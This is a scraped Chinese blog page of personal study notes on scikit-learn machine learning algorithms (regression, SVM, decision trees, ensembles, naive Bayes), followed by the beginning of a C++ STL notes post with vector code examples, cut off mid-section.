PolynomialFeatures会在给定的多项式阶数下，添加所有特征组合。例如，有两个特征a和b，阶数degree&#x3D;3，PolynomialFeatures不只会添加特征a2、a3、b2和b3，还会添加组合ab、a2b以及ab2。 所以要小心特征组合的数量爆炸。 12345678# 多项式回归，增加原特征的平方作为新特征from sklearn.preprocessing import PolynomialFeaturespoly_features = PolynomialFeatures(degree=2, include_bias=False)X_poly = poly_features.fit_transform(X)# X_poly现在包含原本的特征X和该特征的平方lin_reg = LinearRegression()lin_reg.fit(X_poly, y)print(lin_reg.intercept_, lin_reg.coef_) 或者使用管道技术一次完成：、 12polynomial_regression = Pipeline([(&quot;poly_features&quot;, PolynomialFeatures(degree=2, include_bias=False)), (&quot;sgd_reg&quot;, LinearRegression())])polynomial_regression.fit(X, y) 4. 学习曲线模型训练时会出现欠拟合和过拟合的问题。 如果无论怎么增大数据集，训练集和测试集的误差接近且较高，那么模型可能欠拟合。这时增大数据集是无效的，需要使用更复杂的模型和寻找更好的特征。 如果训练集和测试集的误差有一定差距，且在训练集上模型的表现好很多，那么说明模型过拟合了。这时需要增加训练数据，直到测试误差接近训练误差。或者对模型进行正则化。 5. 正则线性模型减少过度拟合的一个好办法就是对模型正则化（即约束它）：它拥有的自由度越低，就越不容易过度拟合数据。 比如对于多项式模型来说，正则化可以是降低多项式的阶数。对于线性模型，正则化通常通过约束模型的权重来实现。 岭回归（Ridge Regression）： 在成本函数中添加一个正则项，使得学习中的算法不仅需要拟合数据，同时还要让模型权重保持最小。 在执行岭回归之前，必须对数据进行缩放（例如使用StandardScaler），因为它对输入特征的大小非常敏感。大多数正则化模型都是如此。 超参数α控制的是对模型进行正则化的程度。如果α&#x3D;0，则岭回归就是线性模型。如果α非常大，那么所有的权重都将非常接近于零，结果是一条穿过数据平均值的水平线。 注意，正则项只能在训练的时候添加到成本函数中，一旦训练完成，你需要使用未经正则化的性能指标来评估模型性能。 12345# 使用标准方程求解的岭回归from sklearn.linear_model import Ridgeridge_reg = Ridge(alpha=1, solver=&quot;cholesky&quot;)ridge_reg.fit(X, y)ridge_reg.predict([[1.5]]) 1234# 使用梯度下降的岭回归,正则项为l2表示岭回归sgd_reg = SGDRegressor(penalty=&quot;l2&quot;)sgd_reg.fit(X, y.ravel())print(sgd_reg.predict([[1.5]])) 超参数penalty设置的是使用正则项的类型。设为”l2”表示希望SGD在成本函数中添加一个正则项，等于权重向量的l2范数的平方的一半，即岭回归。 套索回归（Lasso Regression）： 与岭回归一样，它也是向成本函数增加一个正则项，但是它增加的是权重向量的l1范数，而不是l2范数的平方的一半。 Lasso回归的一个重要特点是它倾向于完全消除掉最不重要特征的权重（也就是将它们设置为零）。也就是说，Lasso回归会自动执行特征选择并输出一个稀疏模型（即只有很少的特征有非零权重）。 12345# 使用Lasso回归from sklearn.linear_model import Lassolasso_reg = Lasso(alpha=0.1)lasso_reg.fit(X, y)print(lasso_reg.predict([[1.5]])) 弹性网络（Elastic Net）： 弹性网络是岭回归与Lasso回归之间的中间地带。其正则项就是岭回归和Lasso回归的正则项的混合，混合比例通过r来控制。当r＝0时，弹性网络即等同于岭回归，而当r＝1时，即相当于Lasso回归。 12345# 使用弹性网络from sklearn.linear_model import ElasticNetelastic_net = ElasticNet(alpha=0.1, l1_ratio=0.5)elastic_net.fit(X, y)print(elastic_net.predict([[1.5]])) 如何选择正则化模型： 模型正则化比不正则化可取。大多数情况下，应该避免使用纯线性回归。 岭回归是个不错的默认选择，但是如果你觉得实际用到的特征只有少数几个，那就应该更倾向于Lasso回归或是弹性网络，因为它们会将无用特征的权重降为零。 一般而言，弹性网络优于Lasso回归，因为当特征数量超过训练实例数量，又或者是几个特征强相关时，Lasso回归的表现可能非常不稳定。 6. 逻辑回归（分类）将数据正则化之后，比如使用StandardScaler类，使用LogisticRegression类进行模型建立。逻辑回归被广泛用于估算一个实例属于某个特定类别的概率。 12345from sklearn.linear_model import LogisticRegressionlog_reg = LogisticRegression(C=1e5)log_reg.fit(x_train, y_train)pre_pro = log_reg.predict_proba(x_test) 如果你要求它预测出类别（使用predict（）方法而不是predict_proba（）方法），它将返回一个可能性最大的类别。 与其他线性模型一样，逻辑回归模型可以用l1或l2惩罚函数来正则化。Scikit-Learn默认添加的是l2函数。 控制Scikit-Learn的LogisticRegression模型正则化程度的超参数不是alpha（其他线性模型使用alpha），而是它的逆反：C，C的值越高，模型正则化程度越高。 Softmax回归: 逻辑回归模型经过推广，可以直接支持多个类别，而不需要训练并组合多个二元分类器（如第3章所述）。这就是Softmax回归。 原理很简单：对于一个给定的实例x，Softmax回归模型首先计算出每个类别k的分数sk（x），然后对这些分数应用softmax函数（也叫归一化指数），估算出每个类别的概率。跟逻辑回归分类器一样，Softmax回归分类器将估算概率值最高的类别作为预测类别（也就是分数最高的类别）。 Softmax回归分类器一次只会预测一个类别（也就是说，它是多类别，但是不是多输出），所以它应该仅适用于互斥的类别之上。 Softmax回归的训练目标是得到一个能对目标类别做出高概率估算的模型（也就是其他类别的概率相应要很低），其成本函数（交叉熵）如下： 当只有两个类别（K&#x3D;2）时，该成本函数等价于逻辑回归的成本函数（log损失函数）。 123softmax_reg = LogisticRegression(multi_class=&quot;multinomial&quot;,solver=&quot;lbfgs&quot;, C=10)softmax_reg.fit(X, y)softmax_reg.predict([[5, 2]]) 第二章 KNN算法优点：精度高，对异常值不敏感，无数据输入假定。 缺点：计算复杂度高、空间复杂度高。 适用范围：数值型和标称型。 对未知类别属性的数据集中的每个点依次执行以下操作：(1) 计算已知类别数据集中的点与当前点之间的距离（欧氏距离）；(2) 按照距离递增次序排序；(3) 选取与当前点距离最小的k个点；(4) 确定前k个点所在类别的出现频率；(5) 返回前k个点出现频率最高的类别作为当前点的预测分类。 1234from sklearn.neighbors import KNeighborsClassifierknn = KNeighborsClassifier(n_neighbors=3)# 6折交叉验证scores = cross_val_score(knn, x, y, cv=6, scoring=&#x27;accuracy&#x27;) 当然，KNN也可以用来处理回归任务。返回邻近的K个样本点的标签值的平均数作为预测值。 123# 处理回归任务from sklearn.neighbors import KNeighborsRegressorknn_clf = KNeighborsRegressor(n_neighbors=3) 第三章 SVM算法能够执行线性或非线性分类、回归，甚至是异常值检测任务。它是机器学习领域最受欢迎的模型之一，特别适用于中小型复杂数据集的分类。 优点： 用于二元和多元分类器、回归和新奇性检测 良好的预测生成器，提供了鲁棒的过拟合、噪声数据和异常点处理 当变量比样本还多是依旧有效 快速，即使样本量大于1万 自动检测数据的非线性，不用做变量变换 缺点： 应用在二元分类表现最好，其他预测问题表现不是太好 变量比样例多很多的时候，有效性降低，需要使用其他方案，例如SGD方案 只提供预测结果，如果想要获取预测概率，需要额外方法去获取 如果想要最优结果，需要调参。 使用SVM预测模型的通用步骤： 选择使用的SVM类 用数据训练模型 检查验证误差并作为基准线 为SVM参数尝试不同的值 检查验证误差是否改进 再次使用最优参数的数据来训练模型 1. 线性SVM分类生成决策边界（实线所示），不仅分离类别，并且尽可能远离最近的训练实例（大间隔分类）。决策边界由最接近边界的训练实例确定（支持），这些实例被称为支持向量（下图中已圈出）。 可以将SVM分类器视为在类别之间拟合可能的最宽的”街道“（平行的虚线所示）。 SVM对特征缩放非常敏感，在垂直刻度和水平刻度上生成的决策边界可能存在很大的差异。在左图中，垂直刻度（090）比水平刻度（06）大得多，因此可能的决策边界接近于水平。在特征缩放（例如使用Scikit-Learn的StandardScaler）后，决策边界看起来好很多（见右图）。 软间隔分类： 如果严格地让所有实例都不在”街道“上，并且位于正确的一边，这就是硬间隔分类。硬间隔分类有2个问题：一个是它只在数据线性可分离时才有效；一个是对异常值特别敏感（会影响泛化能力）。 为了避免以上问题，灵活地使用模型，我们尽可能在保持街道宽阔和限制间隔违例（即位于街道之上，甚至在错误的一边的实例）之间找到良好的平衡，这就是软间隔分类。在Scikit-Learn的SVM类中，可以通过超参数C来控制这个平衡：C值越小，则街道越宽，但是间隔违例也会越多。 如果你的SVM模型过度拟合，可以试试通过降低C来进行正则化。 SMO算法： 在求解SVM的决策边界（求解参数）时，会遇到规模正比于训练样本数量的问题，为了避开这个障碍，使用SMO算法来求解其中的参数。 SMO的思想： 每次选择2个变量，然后固定其他变量（参数），然后优化选择的这2个变量，因为每次只优化2个变量，所以非常高效。 使用： LinearSVC类适用于样本数量较多的二元和多元分类（大于10000），它会对偏置项进行正则化，所以你需要先减去平均值，使训练集集中（归一化）。如果使用StandardScaler会自动进行这一步。此外，请确保超参数loss设置为”hinge”，因为它不是默认值。最后，为了获得更好的性能，还应该将超参数dual设置为False，除非特征数量比训练实例还多。可以使用管道技术将归一化和实例化算法统一起来。 1234from sklearn.svm import LinearSVCsvm_clf = LinearSVC(C=1, loss=&quot;hinge&quot;, dual=False, random_state=42)# C越大，越接近硬间隔；使用hinge损失函数，随机种子为42# svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()), (&quot;linear_svc&quot;, LinearSVC(C=1, loss=&quot;hinge&quot;, random_state=42)), ]) SVC类可以使用核函数（后面会讲到），适用于样本数量较少的二元和多元分类（少于10000）。 12from sklearn.svm import SVCsvm_clf = SVC(kernel=&quot;linear&quot;, C=1) # 使用线性核函数 SGDClassifier类它不会像LinearSVC类那样快速收敛，但是对于内存处理不了的大型数据集（核外训练）或是在线分类任务，它非常有效。 123from sklearn.linear_model import SGDClassifier# SGD模型，使用hinge损失函数，alpha为正则化项参数svm_clf = SGDClassifier(loss=&quot;hinge&quot;, alpha=1/(m*C)) 2. 非线性SVM分类有些情况下，数据集无法直接做到线性可分，解决方法之一就是添加更多的特征，将原始数据映射到更高维的空间，使其变得线性可分。 核函数： 添加特征会使得在高维空间计算样本特征内积变得困难，为了避开这个障碍，可以设想一个函数，使样本在高维特征空间的内积等于它们在原始样本空间中通过该函数计算的结果。使用该函数的就可以替代在高维甚至无穷维特征空间中的内积。这个函数就叫做”核函数“。 线性核： 1svm_clf = SVC(kernel=&quot;linear&quot;, C=1) # SVC模型，使用线性核函数 多项式核： 为了将数据集映射到高维特征空间，可以使用PolynomialFeatures转换器直接添加多项式特征。但问题是，如果多项式太低阶，处理不了非常复杂的数据集，而高阶则会创造出大量的特征，导致模型变得太慢。 1polynomial_svm_clf = Pipeline([(&quot;poly_features&quot;, PolynomialFeatures(degree=3)), (&quot;scaler&quot;, StandardScaler()), (&quot;svm_clf&quot;, LinearSVC(C=10, loss=&quot;hinge&quot;, random_state=42))]) 为了解决这个问题，出现了多项式核函数。下面这段代码使用了一个3阶多项式内核训练SVM分类器。超参数coef0控制的是模型受高阶多项式还是低阶多项式影响的程度。 12poly_kernel_svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()), (&quot;svm_clf&quot;, SVC(kernel=&quot;poly&quot;, degree=3, coef0=1, C=5))])poly_kernel_svm_clf.fit(X, y) 高斯核： 123# 使用RBF高斯核函数rbf_kernel_svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()),(&quot;svm_clf&quot;, SVC(kernel=&quot;rbf&quot;, gamma=5, C=0.001))])rbf_kernel_svm_clf.fit(X, y) 另外，还有拉普拉斯核、Sigmoid核。 如何选择核函数： 有一个经验法则是，永远先从线性核函数开始尝试（要记住，LinearSVC比SVC（kernel&#x3D;”linear”）快得多），特别是训练集非常大或特征非常多的时候。如果训练集不太大，你可以试试高斯RBF核，大多数情况下它都非常好用。如果你还有多余的时间和计算能力，你可以使用交叉验证和网格搜索来尝试一些其他的核函数，特别是那些专门针对你的数据集数据结构的核函数。 3. SVM回归(SVR)SVM算法非常全面：它不仅支持线性和非线性分类，而且还支持线性和非线性回归。SVM回归要做的是让尽可能多的实例位于街道上，同时限制间隔违例（也就是不在街道上的实例）。 街道的宽度由超参数ε控制。在间隔内添加更多的实例不会影响模型的预测，所以这个模型被称为ε不敏感。 123# SVM回归svm_reg = LinearSVR(epsilon=1.5)svm_reg.fit(X, y) 要解决非线性回归任务，可以使用核化的SVM模型。 123# 使用核化的SVM模型进行回归svm_poly_reg = SVR(kernel=&quot;poly&quot;, degree=2, C=100, epsilon=0.1)svm_poly_reg.fit(X, y) 第四章 决策树DT决策树是一种由结点和有向边构成的树形结构，结点类型分为内部结点和叶结点，每个内部结点代表对象的一个特征，叶结点则代表对象的类别。决策树中，每一个深度就是一次根据某一特征做出的判断。决策树的特质之一就是它们需要的数据准备工作非常少。特别是，完全不需要进行特征缩放或集中。 鸢尾花决策树： 节点的samples属性统计它应用的训练实例数量（满足该节点属性的实例数量），value属性说明了该节点上每个类别的训练实例数量，gini属性衡量其不纯度（impurity，基尼不纯度）：如果应用的所有训练实例都属于同一个类别，那么节点就是“纯”的（gini&#x3D;0）。 $P_{i,k}$是第$i$个节点上，类别为$k$的训练实例占比。 Scikit-Learn使用的是CART算法（Classification And Regression Tree），该算法仅生成二叉树，可用于分类和回归，使用：基尼不纯度来划分属性。但是，其他算法，比如ID3生成的决策树，其节点可以拥有两个以上的子节点，使用信息增益来划分属性。 一、CART算法1. CART算法（分类）过程如下： （1）使用单个特征k和阈值tk（例如，花瓣长度≤2.45厘米）将训练集分成两个子集。k和tk就是使得成本函数$J$最小化（或者信息增益最大化）的$(k,t_k)$，成本函数衡量划分后的子集的不纯度。 （2）一旦成功将训练集一分为二，它将使用相同的逻辑，继续分裂子集，然后是子集的子集，依次循环递进。 （3）抵达最大深度（由超参数max_depth控制），或是再也找不到能够降低不纯度的分裂时，停止。 明显，决策树的思想是一种贪心选择，它并不会检视一次分裂的不纯度是否为可能的最低值，这样通常可以产生一个相当不错的解，但是不能保证是最优解。而寻找最优树是一个NP完全问题，即使训练集很小时间复杂度也很高，很难解决，所以我们必须接受这个”相当不错“的解。 计算复杂度： 决策树总体预测复杂度是O(log2(m))，m为实例数量，可以看出复杂度与特征数量无关，所以即便是处理大型数据集，预测也很快。 但是，训练时在每一个节点，算法都需要在所有样本上比较所有特征（如果设置了划分时考虑的最大特征数max_features会少一些）。这导致训练的复杂度为O(n×m log(m))，。对于小型训练集（几千个实例以内），Scikit-Learn可以通过对数据预处理（设置presort&#x3D;True表示对样本进行预排序）来加快训练，但是对于较大训练集而言，可能会减慢训练的速度。 过拟合与正则化超参数： 决策树在训练时不会确定参数的数量（树的深度不确定），也叫非参数模型，这会导致模型结构自由而紧密地贴近数据，很可能过拟合。而比如线性回归有预先设定好一部分参数，所以其自由度受限，降低过拟合的风险（但是相应的也增加了拟合不足的风险）。 为了避免过拟合，需要在训练中降低决策树的自由度，即正则化。正则化超参数的选择取决于使用的模型，但是通常至少可以限制决策树的深度。在Scikit-Learn中，这由超参数max_depth控制（默认值为None，意味着无限制）。减小max_depth可使模型正则化，从而降低过度拟合的风险。另外，DecisionTreeClassifier类还有一些其他的参数也可以限制决策树的形状，比如min_samples_split（分裂前节点必须有的最小样本数），min_samples_leaf（叶节点必须有的最小样本数量）等。 还可以先不加约束地训练模型，然后再对不必要的节点进行剪枝（删除），比如一个节点的子节点全部为叶节点，则该节点可被认为不必要，删除；比如χ2测试，是用来估算“提升纯粹是出于偶然”（被称为虚假设）的概率。如果这个概率（称之为p值）高于一个给定阈值（通常是5%，由超参数控制），那么这个节点可被认为不必要，其子节点可被删除。 2. CART算法（回归）决策树也可以用来完成回归任务，用Scikit_Learn的DecisionTreeRegressor来构建一个回归树。 与分类决策树的主要差别在于，每个节点上不再是预测一个类别而是预测一个值。预测结果就是与最后到达的叶节点关联的110个实例的平均目标值。MSE表示在这个叶节点上得到的预测结果的均方误差。 回归任务中，CART算法的工作原理跟前面介绍的大致相同，唯一不同在于，它分裂训练集的方式不是最小化不纯度，而是最小化MSE。 同样，用于回归的决策树也会有过拟合的可能，所以需要设置min_samples_leaf。 3. 优缺点决策树使用简单，不受特征数量的限制，但是青睐正交的决策边界（所有的分裂都与轴线垂直），这导致它们对训练集的旋转非常敏感，可能导致泛化不佳，限制这种问题的方法之一是使用PCA，让训练数据定位在一个更好的方向上。更概括地说，决策树的主要问题是它们对训练数据中的小变化非常敏感。 二、ID3算法三、C4.5算法（J48）使用信息增益选择特征 第五章 集成学习与随机森林一、模型融合1. 投票分类器不同的算法在相同训练集上进行训练，得到多个预测模型，然后基于多个模型的预测结果投票选出最终结果。 硬投票法： 直接让各个预测模型给出预测结果（投票），然后选择大多数模型投票的类别作为最终预测结果。 软投票法： 模型估算出类别的概率（predict_proba()），将概率在所有单个分类器上（加权）平均，选出平均概率最高的类别进行预测。软投票法比硬投票的表现更优，因为它基于哪些高度自信的投票更高的权重。 2. bagging 和 pasting对训练集随机采样，使用相同的算法在不同的训练子集上进行训练。采样时如果将样本放回，这种方法叫bagging，不放回叫pasting。（bootstrap&#x3D;True表示bagging，否则表示pasting） 一旦预测器训练完成，集成就可以通过简单地聚合所有预测器的预测，来对新实例做出预测。聚合函数通常是统计法（即最多数的预测好比硬投票分类器一样）用于分类，或是平均法用于回归。最终结果是，与直接在原始训练集上训练的单个预测器相比，集成方法的单个预测器的偏差更大，但是最终结果的偏差相近，方差更低。 包外评估： 使用bagging时，有些样本可能会被多次采样，有些样本可能不会被采样。不划分单独的测试集，而直接将那些未被采样的样本作为测试集，就是包外评估。 3. stacking第一层：将数据分为训练集和测试集，训练集再分为2个子集。首先在子集1上训练不同的模型： 第二层：分别使用前面训练好的几个模型对子集2进行预测，得到多个预测值。接着，使用这些预测值作为输入特征，创建一个新的训练集，并保留真实标签。在这个新的训练集上训练混合器，让它学习根据第一层的预测来在测试集上预测目标值。 当然，这个模型还可以增加层数，增加的层都是使用上一层的预测值作为输入特征来训练模型。 比如下面是一个三层的stacking模型： 将训练集分为3个子集。第一层使用子集1进行模型的训练，得到3个模型。第二层中，使用第一层的模型在子集2上的预测作为输入特征来训练三个新的模型。第三层中，使用第二层的模型在子集3上的预测作为输入特征来训练最终模型。最后使用最终模型在测试集上进行预测。 不幸的是，Scikit-Learn不直接支持堆叠，但是自己堆出stacking的实现并不太难。或者也可以使用开源的实现方案，例如brew（可从https://github.com/viisar/brew获得）。 二、随机森林RF随机森林就是决策树的集成，通常采用bagging集成方法（有时也可以是pasting）。 训练子集的大小通过max_samples来设置。在sklearn中，除了先构建一个BaggingClassifier然后将结果传输到DecisionTreeClassifier，还有一种方法就是直接使用RandomForestClassifier或者RandomForestRegressor类。 随机森林在树的生长上引入了更多的随机性：分裂节点时不再是搜索最好的特征，而是在一个随机生成的特征子集里搜索最好的特征。这导致决策树具有更大的多样性，用更高的偏差换取更低的方差，总之，还是产生了一个整体性能更优的模型。 三、提升法boosting提升法（Boosting，最初被称为假设提升）是指可以将几个弱学习器结合成一个强学习器的任意集成方法。大多数提升法的总体思路是循环训练预测器，每一次都对其前序做出一些改正。 1. AdaBoost新预测器对其前序进行纠正的办法之一，就是更多地关注前序拟合不足的训练实例。从而使新的预测器不断地越来越专注于难缠的问题，这就是AdaBoost使用的技术。 过程如下： （1）训练一个基础分类器（比如决策树），用它对训练集进行预测。 （2）然后对错误分类的训练实例增加其相对权重 （3）使用这个最新的权重对第二个分类器进行训练，然后再次对训练集进行预测 （4）继续对错误分类的训练实例增加其权重，如此循环 （5）当到达所需数量的预测器，或得到完美的预测器时，算法停止 （6）这样就得到若干个预测器，再使用bagging或pasting等集成方法得到最终预测结果 优缺点： AdaBoost不再是调整单个预测器的参数使损失函数最小化，而是不断在集成中加入预测器，使模型越来越好。而且每次训练是基于加权的训练集。 这种依序学习技术有一个重要的缺陷就是无法并行（哪怕只是一部分），因为每个预测器只能在前一个预测器训练完成并评估之后才能开始训练，在这一点上AdaBoost的表现不及bagging和pasting方法。 权重： AdaBoost中，每个预测器有一个权重，通过其加权误差率、学习率计算而来，预测器的准确率越高，其权重就越高。同时，每个样本实例也有权重。最开始每个实例的权重都一样，一个预测器预测完成后，会对实例的权重进行更新，也就是提升被错误分类的实例的权重。 使用： Scikit-Learn使用的其实是AdaBoost的一个多分类版本，叫作SAMME（http://goo.gl/Eji2vR）[4]（基于多类指数损失函数的逐步添加模型）。当只有两个类别时，SAMME即等同于AdaBoost。此外，如果预测器可以估算类别概率（即具有predict_proba（）方法），Scikit-Learn会使用一种SAMME的变体，称为SAMME.R（R代表 “Real”,它依赖的是类别概率而不是类别预测，通常表现更好。 2. 梯度提升GBDT 四、XGBoost第六章 贝叶斯分类器贝叶斯分类是一类分类算法的总称，这类算法均以贝叶斯定理为基础，故统称为贝叶斯分类。而朴素朴素贝叶斯分类是贝叶斯分类中最简单，也是常见的一种分类方法。 一、贝叶斯公式： 原理： X：特征向量；Y：类别先验概率P(X)：指根据以往经验和分析得到的概率。后验概率P(Y|X)：事情已经发生，要求这件事情发生的原因是由某个因素引起的可能性的大小。类条件概率P(X|Y)：在已知某类别的特征空间中，出现特征值X的概率密度。 如果需要选出某样本属于哪类，则需要根据该条样本求出它属于每个类的概率，选择最大概率的那个类作为分类结果。 由于结果的产生是比较属于各个类别的概率，所以计算的概率的分母都是P(X)，可以忽略掉P(X)。同时P(Y)容易求出，那么我们关注P(X|Y)。朴素贝叶斯之所以朴素是因为它假设X的每个特征都是独立的，回归原始。故而P(X|Y)的概率就可以计算为： 故，朴素贝叶斯公式： 二、朴素贝叶斯模型：1. 多项式模型：多项式模型在计算先验概率P(Yk)和条件概率P(xi|Yk)时，会做一些平滑处理，具体公式为：$$P(Y_k) &#x3D; \\frac{N_{Y_k}+\\alpha}{N+K\\alpha}$$ $N_{Y_k}$：类别为$Y_k$的样本数 N：总样本数 K：总的类别个数 $\\alpha$：平滑值 $N_{Y_k,x_i}$：类别为$Y_k$，且特征为$x_i$的样本数 n：特征$x_i$可以选择的数量 123456# 多项式朴素贝叶斯，alpha为平滑参数，默认为1# class_prior为类先验概率，若指定了该参数，就按指定的参数计算。class_log_prior_取值就是class_prior转换成log后的结果（防止下溢出）# fit_prior默认为True，表示是否学习先验概率，为False时表示所有类标记具有相同的先验概率（等于类标记总个数N分之一）pnb_clf = MultinomialNB(alpha=2.0, class_prior=None, fit_prior=True)pnb_clf.fit(X,y)print(pnb_clf.predict([[1,3,5,6],[3,4,5,4]])) 2. 高斯模型：当特征是连续变量的时候，假设特征分布为正太分布，根据样本算出均值和方差，再求得概率。 12345# 高斯朴素贝叶斯# 参数priors默认为None，指各个类标记对应的先验概率gnb_clf = GaussianNB()gnb_clf.fit(X,y) # partial_fit表示增量学习print(gnb_clf.predict([[1,3,5,6],[3,4,5,4]])) 3. 伯努利模型：伯努利模型适用于离散特征的情况，每个特征的取值只能是1和0。 12345# 伯努利朴素贝叶斯（每个特征的取值只能是1和0）# 参数binarize指将数据特征二值化的阈值bnb_clf = BernoulliNB(alpha=2.0,binarize = 3.0,fit_prior=True)bnb_clf.fit(X,y)print(bnb_clf.predict([[1,3,5,6],[3,4,5,4]])) 算法流程： 处理数据，得到m个具有n个特征的样本，这些样本分别属于${Y_1,Y_2,Y_3}$类别。 通过数据分析可以得到每个特征的类条件概率$P(x_i|Y)$，再通过全概率公式求得$P(X)$。 $P(X)&#x3D;P(X|Y_1)P(Y_1)+P(X|Y_2)P(Y_2)+P(X|Y_3)P(Y_3)$ 其中$P(X|Y_i)$可根据特征独立性展开。 将求得的先验概率和类条件概率带入朴素贝叶斯公式，求得每个类别的后验概率。我们可以选择概率最大的类别为最后确定的类别. 第七章 神经网络第八章 聚类K-means 附录：《机器学习实战》目录： 1~7为分类算法，8~9为回归算法，10~12为无监督算法 ML基础 KNN DT NB（概率分布） LR（算法优化，处理数据集合中的缺失值） SVM AdaBoost 回归、去噪、局部线性回归 CART（回归部分） k-means Apriori FP-Growth 主成分分析、奇异值分解、MapReduce","raw":null,"content":null,"categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://frankcao3.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"STL","slug":"计算机基础/3. STL","date":"2021-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.709Z","comments":true,"path":"posts/[object Object]/计算机基础/3. STL/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/3.%20STL/undefined","excerpt":"","text":"STL参考链接： http://c.biancheng.net/stl/ 概念STL，英文全称 standard template library，中文可译为标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入&#x2F;输出、数学计算等功能。 STL 最初由惠普实验室开发，于 1998 年被定为国际标准，正式成为 C++ 程序库的重要组成部分。值得一提的是，如今 STL 已完全被内置到支持 C++ 的编译器中，无需额外安装，这可能也是 STL 被广泛使用的原因之一。 STL 就位于各个 C++ 的头文件中，即它并非以二进制代码的形式提供，而是以源代码的形式提供。 从根本上说，STL 是一些容器、算法和其他一些组件的集合，所有容器和算法都是总结了几十年来算法和数据结构的研究成果，汇集了许多计算机专家学者经验的基础上实现的，因此可以说，STL 基本上达到了各种存储方法和相关算法的高度优化。 注意，这里提到的容器，本质上就是封装有数据结构的模板类，例如 list、vector、set、map 等 STL的头文件：algorithm，numeric，vector，deque，list，queue，stack，set，map，iterator，memory，utility 1. Algorithm123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;algorithm&gt; // 使用Algorithm必须包含的头文件#include &lt;cstdio&gt;using namespace std;int main () &#123; //排序 int a[5] = &#123;5, 1, 2, 3,7&#125;; sort (a, a+5); // stable_sort (a, a+5); for (int i = 0; i &lt; 5; i++) cout &lt;&lt; a[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; // 反转 reverse(a, a+5); for (int i = 0; i &lt; 5; i++) cout &lt;&lt; a[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; // 绝对值 cout &lt;&lt; abs(-5) &lt;&lt; endl; // 最大值最小值 cout &lt;&lt; max(5, 3) &lt;&lt; &quot; &quot; &lt;&lt; min(5, 3) &lt;&lt; endl; // 交换 int x = 1, y = 2; swap (x, y); cout &lt;&lt; x &lt;&lt; &quot; &quot; &lt;&lt; y &lt;&lt; endl; // 赋值函数fill int b[4] = &#123;1, 2, 3, 4&#125;; fill (b, b+4, -1); //前4个元素全赋值为-1 for (int i = 0; i &lt; 4; i ++) cout &lt;&lt; b[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; //求全排列的下一个顺序, next_permutation若有下一个全排列返回true没有则返回false char str[3] = &#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;; do &#123; cout &lt;&lt; str &lt;&lt; endl; &#125;while (next_permutation(str, str+3)); return 0;&#125; 2. Container2.1 序列容器主要包括 vector 向量容器、list 列表容器以及 deque 双端队列容器。之所以被称为序列容器，是因为元素在容器中的位置同元素的值无关，即序列容器不是排序的。将元素插入容器时，指定在什么位置，元素就会位于什么位置。 vectorvector相比数组的好处是可以根据存储数据的数量自动变长，并且有很多方法可以直接调用。 vector容器在尾部增加或删除元素的效率最高（时间复杂度为 O(1) 常数阶），在其它位置插入或删除元素效率较差（时间复杂度为 O(n) 线性阶，其中 n 为容器中元素的个数） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;vector&gt;int main()&#123; // -----------------------初始化----------------------- vector&lt;int&gt; a; //定义容器a，当前a长度为0，但和普通数组不同的是，此a可以根据存储数据的数量自动变长。 vector&lt;int&gt; b &#123;&#125;; //指定为空 vector&lt;int&gt; c(20); //指定有20个元素，且全为0 vector&lt;int&gt; d(20, -1); //指定有20个元素，且全为-1，这里可以使用变量进行初始化 // 使用其他数据结构初始化 int array[] = &#123;1,2,3&#125; vector&lt;int&gt; value(array,array+3); // 使用数组初始化vector vector&lt;int&gt; value1&#123;1,2,3,4,5&#125;; vector&lt;int&gt; value2(value1.begin(),value1.begin()+3); // 使用vector初始化vector value2.assign(value1.begin(),value1.begin()+3); //使用assign方法初始化 // -----------------------手动调整大小----------------------- a.resize(100); // 默认初始化为0 a.resize(20, -1) //重新调整 a 的大小为 20，并存储 20 个 -1 元素。 // 赋值 a[9] = 100; // -----------------------添加元素----------------------- for (int i = 0; i &lt; 10 ; i++)&#123; //向a中添加10个元素 a.emplace_back(i); &#125; a.insert(a.begin(), 100， 2); //向指定位置的前面添加元素，2个100 a.emplace(a.begin(), 100); //emplace每次只能插入一个元素，但是emplace的效率更高 // -----------------------访问元素----------------------- cout&lt;&lt;a[0]&lt;&lt;endl; // 访问单个元素，直接使用下标，可能越界 cout &lt;&lt; &quot;首个元素为：&quot; &lt;&lt; a.at(0) &lt;&lt; endl; // 使用at方法访问,会进行越界判断 cout &lt;&lt; &quot;values 首元素为：&quot; &lt;&lt; values.front() &lt;&lt; endl; cout &lt;&lt; &quot;values 尾元素为：&quot; &lt;&lt; values.back() &lt;&lt; endl; for (auto i = a.begin(); i &lt; a.end(); i++) &#123; //使用迭代器遍历容器 cout &lt;&lt; *i &lt;&lt; &quot; &quot;; &#125; // -----------------------删除----------------------- a.pop_back(); // 删除最后一个元素，size会减小，但capacity不会变 a,erase(a.begin(), a,begin+3); // 删除指定位置的元素，并返回指向被删除元素下一个位置元素的迭代器，size会减小，但capacity不会变 auto it = remove(a.begin(), a.end(), 3);; // 删除等于指定值的元素，并返回指向被删除元素下一个位置元素的迭代器，，size和capacity都不会变 a.clear(); // 清空，size变为0，capacity不会变 // -----------------------交换元素----------------------- // 注意，swap() 函数在头文件 &lt;algorithm&gt; 和 &lt;utility&gt; 中都有定义，使用时引入其中一个即可。 swap(*(a.begin()+1),*(a.end()-1)); //等同于 swap(a[1],a[4]) return 0;&#125; 注意，vector 容器在使用resize()申请更多内存的同时，容器中的所有元素可能会被复制或移动到新的内存地址，这会导致之前创建的迭代器失效。因此，为了保险起见，每当 vector 容器的容量发生变化时，我们都要对之前创建的迭代器重新初始化一遍： 注意，不要使用vector&lt;bool&gt;，该类型使用bit进行存储，会有很多问题 array、vector 和 deque 